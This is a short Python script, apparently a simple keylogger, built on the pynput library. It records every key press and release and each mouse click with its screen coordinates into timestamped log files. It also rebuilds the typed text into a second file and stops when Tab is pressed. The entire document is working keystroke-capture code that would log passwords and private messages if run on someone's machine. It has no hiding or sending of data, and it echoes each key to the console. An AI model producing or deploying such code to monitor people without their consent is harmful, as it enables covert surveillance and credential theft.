from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Button, Listener as MouseListener
import time

def keyPressed(key):
        
        writeLog(str(key)+" pressed")

        clearLetter(key)
        

def keyReleased(key, endKey="Key.tab"):
        
        writeLog(str(key)+" released")

        print(str(key))

        if str(key) == endKey:
                writeLog("######### end logging #########")
                writeText("\n-> stop writing... (at "+time.strftime("%d.%m.%Y %H:%M:%S")+")\n")
                return False
        
def mouseClicked(x,y,button,pressed):

        if pressed:

                if button == Button.left:
                        writeLog("mouse clicked left at ("+str(x)+","+str(y)+")")
                elif button == Button.right:
                        writeLog("mouse clicked right at ("+str(x)+","+str(y)+")")
                elif button == Button.middle:
                        writeLog("mouse clicked middle at ("+str(x)+","+str(y)+")")
        
        clearLetter("[*CLICK*]\n")
        
def writeLog(text, file="logfile.txt"):

        with open(file, "a") as f:
                f.write(time.strftime("%d.%m.%Y %H:%M:%S - ")+text+'\n')

def clearLetter(key):

        letter = str(key)

        letter = letter.replace("'","")
        if letter == '""':
                letter = "'"
                
        if letter == "Key.space":
                letter = ' '
        elif letter == "Key.shift_r" or letter == "Key.alt_l" or letter == "Key.ctrl_l":
                letter = ''
        elif letter == "Key.enter" or letter == "Key.esc":
                letter = '\n'
                
        elif letter == "Key.left":
                letter = "[<-]"
        elif letter == "Key.right":
                letter = "[->]"
        elif letter == "Key.up":
                letter = "[ARROW_UP]"
        elif letter == "Key.down":
                letter = "[ARROW_DOWN]"
        elif letter == "Key.backspace":
                letter = "[*DELETE*]"
        elif letter == "Key.tab":
                letter = "[TAB][!STOP LOGGING LEY PRESSED!]"

        '''
        elif letter == "<67>" or letter == "\x03":
                letter = "[STRG-C]"
        elif letter == "<86>" or letter == "\x16":
                letter = "[STRG-V]"
        elif letter == "\x11":
                letter = "[@]"

        F1-12
        '''
                     
        writeText(letter)
        

def writeText(letter, file="text.txt"):

        with open(file, "a") as f:
                f.write(letter)
                

writeLog("######## start logging ########")
writeText("-> start writing... (at "+time.strftime("%d.%m.%Y %H:%M:%S")+")\n")

with MouseListener(on_click=mouseClicked) as listener:
        with KeyboardListener(on_press=keyPressed, on_release=keyReleased) as listener:
                listener.join()

